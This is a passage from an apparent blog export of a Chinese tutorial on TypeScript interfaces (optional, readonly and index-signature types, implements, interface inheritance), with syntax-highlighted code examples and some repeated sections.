相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr: ReadonlyArray&lt;<span class=\"built_in\">number</span>&gt; = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">arr[<span class=\"number\">0</span>] = <span class=\"number\">2</span>; <span class=\"comment\">// -&gt; error</span></span><br><span class=\"line\">arr.push(<span class=\"number\">5</span>); <span class=\"comment\">// -&gt; error</span></span><br><span class=\"line\">arr.length = <span class=\"number\">10</span>; <span class=\"comment\">// -&gt; error</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> arr1: <span class=\"built_in\">Array</span>&lt;<span class=\"built_in\">number</span>&gt; = arr;</span><br><span class=\"line\"><span class=\"comment\">// error, arr 是ReadonlyArray，不能赋值给别的数组</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"readonly还是const\"><a href=\"#readonly还是const\" class=\"headerlink\" title=\"readonly还是const\"></a>readonly还是const</h4><p>最简单判断该用readonly还是const的方法是看要把它做为变量使用还是做为一个属性。<br>做为变量使用的话用 const，若做为属性则使用readonly。</p>\n<h4 id=\"额外的属性检查\"><a href=\"#额外的属性检查\" class=\"headerlink\" title=\"额外的属性检查\"></a>额外的属性检查</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Pc &#123;</span><br><span class=\"line\">    x?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    y?: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">demo</span>(<span class=\"params\">arg: Pc</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ..</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">demo(&#123;x: <span class=\"number\">100</span>, z: <span class=\"number\">110</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// error，因为 z 并没有在接口 Pc 中定义</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用类型断言改写</span></span><br><span class=\"line\">demo(&#123;x: <span class=\"number\">100</span>, z: <span class=\"number\">110</span>&#125; <span class=\"keyword\">as</span> Pc)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 告诉 ts 入参 '&#123;x: 100, z: 110&#125;' 都是来自于 Pc 接口的，你别 tmd 再帮我检查了</span></span><br><span class=\"line\"><span class=\"comment\">// ts： 好吧，既然你这么确定，我就听你的。</span></span><br></pre></td></tr></table></figure>\n<p>然后上面的这种做法并不是最佳的做法，最佳的做法是添加一个 <code>占位用的签名</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 我不知道我后面还会传什么属性进来，所以我先用个 propsName 占个位置</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Pc &#123;</span><br><span class=\"line\">    x?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    y?: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    [propName: <span class=\"built_in\">string</span>]: <span class=\"built_in\">any</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">demo(&#123;x: <span class=\"number\">100</span>, z: <span class=\"number\">110</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// success</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"函数类型\"><a href=\"#函数类型\" class=\"headerlink\" title=\"函数类型\"></a>函数类型</h4><p>为了使用接口表示函数类型，我们需要给接口定义一个调用签名。 它就像是一个 <code>只有参数列表和返回值类型</code> 的函数定义。<br><strong>参数列表里的每个参数都需要名字和类型。</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Fn &#123;</span><br><span class=\"line\">    (a: <span class=\"built_in\">number</span>, b: <span class=\"built_in\">string</span>): <span class=\"built_in\">boolean</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义一个 Fn 函数接口，该函数接受 a: number，b: string 作为参数，返回一个 boolean 值</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"可索引的类型\"><a href=\"#可索引的类型\" class=\"headerlink\" title=\"可索引的类型\"></a>可索引的类型</h4><p>可索引类型具有一个 <code>索引签名</code>，它描述了对象 <code>索引的类型</code>，还有相应的索引 <code>返回值类型</code>。<br>共有两种索引签名：字符串和数字。可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1. 指定 索引类型 为 number</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> IndexNum &#123;</span><br><span class=\"line\">    [index: <span class=\"built_in\">number</span>]: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> arr: IndexNum = [<span class=\"string\">'hello'</span>, <span class=\"string\">'world'</span>];</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2. 指定 索引类型 为 string</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> IndexStr &#123;</span><br><span class=\"line\">    [index: <span class=\"built_in\">string</span>]: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj: IndexStr = &#123;<span class=\"string\">'x'</span>: <span class=\"string\">'hello'</span>, <span class=\"string\">'y'</span>: <span class=\"string\">'world'</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj[<span class=\"string\">'x'</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 3. 同时指定 索引类型 为 number 和 string</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> TotalIndex &#123;</span><br><span class=\"line\">    [index: <span class=\"built_in\">number</span>]: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    at: <span class=\"built_in\">number</span>; <span class=\"comment\">// success</span></span><br><span class=\"line\">    where: <span class=\"built_in\">string</span>; <span class=\"comment\">// error 使用 where 获取值时返回的是 string 类型</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 4. 只读的索引类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> RdIndex &#123;</span><br><span class=\"line\">    readonly [index: <span class=\"built_in\">number</span>]: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> arr: RdIndex = [<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">arr[<span class=\"number\">1</span>] = <span class=\"string\">'c'</span>; <span class=\"comment\">// error, arr 为只读的索引类型</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"‘类’类型\"><a href=\"#‘类’类型\" class=\"headerlink\" title=\"‘类’类型\"></a>‘类’类型</h4><p>和其它的类型约束相似，类类型使用 <code>implements</code> 实现接口。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义方式完全一致</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> C &#123;</span><br><span class=\"line\">    date: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">    setTime(d: <span class=\"built_in\">Date</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"keyword\">class</span> Clock <span class=\"keyword\">implements</span> C &#123;</span><br><span class=\"line\">     <span class=\"comment\">// 声明一个 date 属性，且约束该属性类型为 Date</span></span><br><span class=\"line\">     <span class=\"comment\">// 这种写法相当于 var date: Date</span></span><br><span class=\"line\">     <span class=\"comment\">// 只是声明并约束值类型，但并不赋值</span></span><br><span class=\"line\">    date: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">    setTime(d: <span class=\"built_in\">Date</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.date = d;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">h: <span class=\"built_in\">number</span>, m: <span class=\"built_in\">number</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ..</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>关于更多的 <code>implements</code> 的用法我目前也不是特别的清楚，所以下面就不再详细叙述了。<br>等我了解清楚之后再补上这一部分内容，你也可以通过查看<a href=\"https://www.tslang.cn/docs/handbook/interfaces.html\" target=\"_blank\" rel=\"noopener\">官方文档</a>了解。</p>\n<h4 id=\"继承接口\"><a href=\"#继承接口\" class=\"headerlink\" title=\"继承接口\"></a>继承接口</h4><p>和 <code>es2015</code> 中的 <code>extends</code> 一样，接口也是可以像类一样用来继承的。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> A &#123;</span><br><span class=\"line\">    a: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> C &#123;</span><br><span class=\"line\">    c: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> B <span class=\"keyword\">extends</span> A, C &#123;</span><br><span class=\"line\">    b: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj = &lt;B&gt;&#123;&#125;;</span><br><span class=\"line\">obj.a = <span class=\"number\">10</span>;</span><br><span class=\"line\">obj.b = <span class=\"string\">'10'</span>;</span><br><span class=\"line\">obj.c = <span class=\"number\">10</span>;</span><br></pre></td></tr></table></figure>\n<h4 id=\"混合类型\"><a href=\"#混合类型\" class=\"headerlink\" title=\"混合类型\"></a>混合类型</h4><p><code>interface</code> 还可以在一个接口中约束 <code>javascript</code> 中多个类型；</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Counter &#123;</span><br><span class=\"line\">    a: <span class=\"built_in\">number</span>; <span class=\"comment\">// 约束 a 为 number 类型</span></span><br><span class=\"line\">    getStr(): <span class=\"built_in\">void</span>;<span class=\"comment\">// 约束 getStr 无返回值；</span></span><br><span class=\"line\">    (n: <span class=\"built_in\">number</span>): <span class=\"built_in\">string</span>;<span class=\"comment\">// 约束匿名函数接受一个参数 n 为 number 类型，返回值 string 类型</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 函数 getCounter 返回值被 Counter 约束</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCounter</span>(<span class=\"params\"></span>): <span class=\"title\">Counter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> counter = &lt;Counter&gt;<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">start: <span class=\"built_in\">number</span></span>) </span>&#123; &#125;; <span class=\"comment\">// 类型断言</span></span><br><span class=\"line\">    counter.interval = <span class=\"number\">123</span>;</span><br><span class=\"line\">    counter.reset = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> counter;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> c = getCounter();</span><br><span class=\"line\">c(<span class=\"number\">10</span>);</span><br><span class=\"line\">c.reset();</span><br><span class=\"line\">c.interval = <span class=\"number\">5.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// 这个模版有问题，写 ts 的代码就会出问题</span></span><br><span class=\"line\"><span class=\"comment\">// 只能这样了</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"接口继承类\"><a href=\"#接口继承类\" class=\"headerlink\" title=\"接口继承类\"></a>接口继承类</h4><p>接口继承类时会继承父类所有的属性和方法，包括 <code>private</code> 和 <code>protected</code> 成员。<br>这意味着当你创建了一个接口继承了一个拥有 <code>私有或受保护的成员</code> 的类时，这个接口类型只能被 <code>这个类或其子类</code> 所实现（implement）。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Control &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> state: <span class=\"built_in\">any</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// SelectableControl 含有 Control 所有的属性方法</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> SelectableControl <span class=\"keyword\">extends</span> Control &#123;</span><br><span class=\"line\">    select(): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Button 继承自 Control 含有 Control 所有的属性方法</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> Button <span class=\"keyword\">extends</span> Control <span class=\"keyword\">implements</span> SelectableControl &#123;</span><br><span class=\"line\">    select() &#123; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// TextBox 继承自 Control 含有 Control 所有的属性方法</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> TextBox <span class=\"keyword\">extends</span> Control &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Image 没有继承自 Control，没有 state 属性，无法实现 SelectableControl 接口</span></span><br><span class=\"line\"><span class=\"comment\">// 错误：“Image”类型缺少“state”属性。</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> Image <span class=\"keyword\">implements</span> SelectableControl &#123;</span><br><span class=\"line\">    select() &#123; &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>本篇介绍 <code>typescript</code> 中接口的使用方式。<br>","more":"</p>\n<h3 id=\"接口-interface\"><a href=\"#接口-interface\" class=\"headerlink\" title=\"接口(interface)\"></a>接口(interface)</h3><p><code>TypeScript</code>的核心原则之一是对值所具有的结构进行类型检查。接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。<br>基础类型是为简单的变量定义类型，<strong>通常的，接口就是为你所定义的对象(参数、函数等)的添加类型的约束。</strong><br>按照 typescript 的默认约定，接口通常是以 <code>驼峰命名方式，大写字母开头</code> 的方式定义。</p>\n<h4 id=\"使用方式\"><a href=\"#使用方式\" class=\"headerlink\" title=\"使用方式\"></a>使用方式</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义一个接口约束</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> T &#123;</span><br><span class=\"line\">    num: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    str: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 函数的接受的参数中，num必须为number类型，str必须为string类型</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">demo</span>(<span class=\"params\">arg: T</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> arg.num)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 也可以直接把约束条件写在函数参数中，为了可读性，推荐在外面定义</span></span><br><span class=\"line\"><span class=\"comment\">// eg:</span></span><br><span class=\"line\"><span class=\"comment\">// function demo(arg: &#123; num: number; str: string &#125;) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     console.log(typeof arg.num)</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj1 = &#123;num: <span class=\"number\">100</span>, str: <span class=\"string\">'typescript'</span>&#125;</span><br><span class=\"line\">demo(obj1) <span class=\"comment\">// success -&gt; number</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj2 = &#123;num: <span class=\"string\">'123'</span>, str: <span class=\"string\">'typescript'</span>&#125;</span><br><span class=\"line\">demo(obj2) <span class=\"comment\">// error</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj3 = &#123;num: <span class=\"number\">123</span>&#125;</span><br><span class=\"line\">demo(obj3) <span class=\"comment\">// error 缺少一个 str 参数</span></span><br></pre></td></tr></table></figure>\n<p><strong>注意：定义接口的时候不需要使用 <code>=</code>，<code>{}</code> 内部必须使用 <code>分号(;)</code> 分隔。</strong></p>\n<h4 id=\"接口的可选属性\"><a href=\"#接口的可选属性\" class=\"headerlink\" title=\"接口的可选属性\"></a>接口的可选属性</h4><p>接口里的属性不全都是必需的。 有些是只在某些条件下存在，或者根本不存在。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> T &#123;</span><br><span class=\"line\">    num: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    str?: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">demo</span>(<span class=\"params\">arg: T</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> arg.num)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj4 = &#123;num: <span class=\"number\">100</span>, str: <span class=\"string\">'typescript'</span>&#125;</span><br><span class=\"line\">demo(obj4) <span class=\"comment\">// success</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj5 = &#123;num: <span class=\"number\">100</span>&#125;</span><br><span class=\"line\">demo(obj5) <span class=\"comment\">// success</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj6 = &#123;str: <span class=\"string\">'typescript'</span>&#125;</span><br><span class=\"line\">demo(obj6) <span class=\"comment\">// error</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"接口的只读属性\"><a href=\"#接口的只读属性\" class=\"headerlink\" title=\"接口的只读属性\"></a>接口的只读属性</h4><p>这里的 <code>只读属性</code> 类似于原生javascript的 <code>const</code> 关键字，在赋值之后就不能更改了。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Rd &#123;</span><br><span class=\"line\">    readonly x: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    readonly y: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> r: Rd = &#123; x: <span class=\"number\">100</span>, y: <span class=\"string\">'str'</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">r.x = <span class=\"number\">123</span>; <span class=\"comment\">// -&gt; error</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"只读的数组\"><a href=\"#只读的数组\" class=\"headerlink\" title=\"只读的数组\"></a>只读的数组</h4><p>TypeScript具有 <code>ReadonlyArray&lt;T&gt;</code> 类型，它与 <code>Array&lt;T&gt;</code> 相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr: ReadonlyArray&lt;<span class=\"built_in\">number</span>&gt; = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">arr[<span class=\"number\">0</span>] = <span class=\"number\">2</span>; <span class=\"comment\">// -&gt; error</span></span><br><span class=\"line\">arr.push(<span class=\"number\">5</span>); <span class=\"comment\">// -&gt; error</span></span><br><span class=\"line\">arr.length = <span class=\"number\">10</span>; <span class=\"comment\">// -&gt; error</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> arr1: <span class=\"built_in\">Array</span>&lt;<span class=\"built_in\">number</span>&gt; = arr;</span><br><span class=\"line\"><span class=\"comment\">// error, arr 是ReadonlyArray，不能赋值给别的数组</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"readonly还是const\"><a href=\"#readonly还是const\" class=\"headerlink\" title=\"readonly还是const\"></a>readonly还是const</h4><p>最简单判断该用readonly还是const的方法是看要把它做为变量使用还是做为一个属性。<br>做为变量使用的话用 const，若做为属性则使用readonly。</p>\n<h4 id=\"额外的属性检查\"><a href=\"#额外的属性检查\" class=\"headerlink\" title=\"额外的属性检查\"></a>额外的属性检查</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Pc &#123;</span><br><span class=\"line\">    x?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    y?: <span class=\"built_in\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">demo</span>(<span class=\"params\">arg: Pc</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ..</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">demo(&#123;x: <span class=\"number\">100</span>, z: <span class=\"number\">110</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// error，因为 